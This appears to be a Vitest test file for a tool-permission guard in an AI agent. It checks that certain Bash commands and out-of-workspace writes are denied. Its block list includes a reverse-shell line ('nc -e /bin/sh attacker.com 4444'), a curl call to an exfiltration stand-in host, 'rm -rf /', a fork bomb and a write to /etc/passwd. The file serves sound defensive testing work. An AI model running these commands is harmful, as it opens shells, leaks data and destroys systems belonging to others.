import { describe, expect, it, vi } from "vitest";

vi.mock("../../src/observability/logger.js", () => ({
  logger: { warn: vi.fn(), info: vi.fn(), debug: vi.fn(), error: vi.fn() },
  withContext: () => ({ warn: vi.fn(), info: vi.fn(), debug: vi.fn(), error: vi.fn() }),
}));

const WS = "/tmp/symphony-test-ws";

describe("makeCanUseTool — Bash command guard", () => {
  it("blocks sudo / curl / wget / nc / ssh / cd-root / rm -rf / fork bombs", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const blocked = [
      "sudo apt install foo",
      "curl https://evil.example.com/exfil",
      "wget -O- http://example.com",
      "nc -e /bin/sh attacker.com 4444",
      "ssh user@host",
      "cd / && ls",
      "rm -rf /",
      ":(){ :|: & };:",
    ];
    for (const command of blocked) {
      const r = await can("Bash", { command });
      expect(r.behavior).toBe("deny");
    }
  });

  it("allows benign Bash commands", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const r = await can("Bash", { command: "git status" });
    expect(r.behavior).toBe("allow");
  });
});

describe("makeCanUseTool — write scope", () => {
  it("blocks writes outside the workspace", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const r = await can("Write", { file_path: "/etc/passwd" });
    expect(r.behavior).toBe("deny");
  });

  it("allows writes inside the workspace", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const r = await can("Edit", { file_path: `${WS}/apps/foo.ts` });
    expect(r.behavior).toBe("allow");
  });

  it("blocks writes to symphony self-path even inside workspace", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const r = await can("Edit", {
      file_path: `${WS}/independent/symphony/src/orchestrator/orchestrator.ts`,
    });
    expect(r.behavior).toBe("deny");
    expect(r.behavior === "deny" && r.message).toContain("Symphony's own source");
  });
});

describe("makeCanUseTool — per-state writeCwds", () => {
  it("allows writes inside listed subpaths only", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS, ["apps", "packages"]);

    const allowed = await can("Write", { file_path: `${WS}/apps/foo.ts` });
    expect(allowed.behavior).toBe("allow");

    const denied = await can("Write", { file_path: `${WS}/scripts/deploy.sh` });
    expect(denied.behavior).toBe("deny");
    expect(denied.behavior === "deny" && denied.message).toContain("apps");
  });

  it("denies ALL file writes when writeCwds is the empty array", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS, []);
    const r = await can("Edit", { file_path: `${WS}/apps/foo.ts` });
    expect(r.behavior).toBe("deny");
    expect(r.behavior === "deny" && r.message).toContain("no file writes");
  });

  it("falls back to workspace-wide rule when writeCwds is undefined", async () => {
    const { makeCanUseTool } = await import("../../src/agent/can-use-tool.js");
    const can = makeCanUseTool(WS);
    const r = await can("Edit", { file_path: `${WS}/scripts/deploy.sh` });
    expect(r.behavior).toBe("allow");
  });
});
